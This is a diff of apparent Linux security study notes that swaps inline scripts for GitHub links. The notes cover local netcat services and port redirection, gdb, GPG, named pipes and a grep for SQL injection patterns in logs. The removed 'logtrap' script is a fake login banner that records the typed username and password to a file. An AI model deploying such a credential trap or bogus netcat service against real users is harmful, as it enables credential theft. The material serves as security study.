@@ -41,7 +41,7 @@
    1) $nc -v -o xxx2 127.0.0.1 22    #connect somewhere, output a file
    2) $nc -v -c 'echo this is a test' -l -p 1235 -t   #create bogus service
       $telnet 127.0.0.1 1235
-   3) $nc -vv -l -c './logtrap' localhost -p 1236 -t -o xxzz  #run a script file
+   3) $nc -vv -l -c './logtrap.sh' localhost -p 1236 -t -o xxzz  #run a script file
       $sudo tcpdump port 1236 -n -vvv -X -i lo -c 66 -s 200
       $netstat -apeen | grep nc    #grab pid
       $ps -aux | grep <pid>
@@ -49,22 +49,7 @@
       $sudo netstat -apeen | grep 1236
    4) $nc -l 1237 | nc 127.0.0.1 111  #redirect port, user connectting 1237 will go to 111
    ```
-   Script file: logtrap
-   ```
-   cat /etc/motd
-   echo welcome to Hermes
-   echo login:
-   read number
-   echo
-   echo $number > ~/passtrap
-   echo passwd:
-   read number
-   echo
-   echo $number >> ~/passtrap
-   echo
-   echo The system is resyncing try again later.
-   ```
-
+   [logtrap.sh](https://github.com/mndarren/Code-Lib/blob/master/Linux_Security_lib/resource/logtrap.sh)
 4. gdb (Attacker and Security) --dump data from register  
    ```
    1) $./add # run program and keep it running
@@ -120,16 +105,7 @@
    2) sudo cat -n sqllog > /mnt/ramdisk/sqllog2 #load sqllog into ramdisk with line #
    3) time cat /mnt/ramdisk/sqllog2 | grep "%27+or+27%"  #get location
    ```
-   Run script file
-   ```
-   echo This is a script file to perform stateful inspection for sql injections
-   mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk
-   sudo cat -n mysqllog > /mnt/ramdisk/mysqllog2
-   cat /mnt/ramdisk/mysqllog2 | grep "%27+or+27%"
-   rm /mnt/ramdisk/mysqllog2
-   unmount /mnt/ramdisk
-   echo end of script
-   ```
+   [monitorLog.sh]((https://github.com/mndarren/Code-Lib/blob/master/Linux_Security_lib/resource/monitorLog.sh))
 7. GPG (security encryption)  **3 times for more secure**
    ```
    $gpg -c zzz483
@@ -148,8 +124,6 @@
    #named pipe can do multiprocess communication, unnamed pipe cannot;
    #named pipe exists in FS, independently from process, unnamed pipe vanished as soon as it's closed or complete execution
    ```
-   encServ.sh
-   ![alt text](https://github.com/mndarren/Code-Lib/blob/master/Linux_Security_lib/resource/encServ.sh)
-   encCli.sh
-   ![alt text](https://github.com/mndarren/Code-Lib/blob/master/Linux_Security_lib/resource/encCli.sh)
+   [encServ.sh](https://github.com/mndarren/Code-Lib/blob/master/Linux_Security_lib/resource/encServ.sh)
+   [encCli.sh](https://github.com/mndarren/Code-Lib/blob/master/Linux_Security_lib/resource/encCli.sh)
 9. 
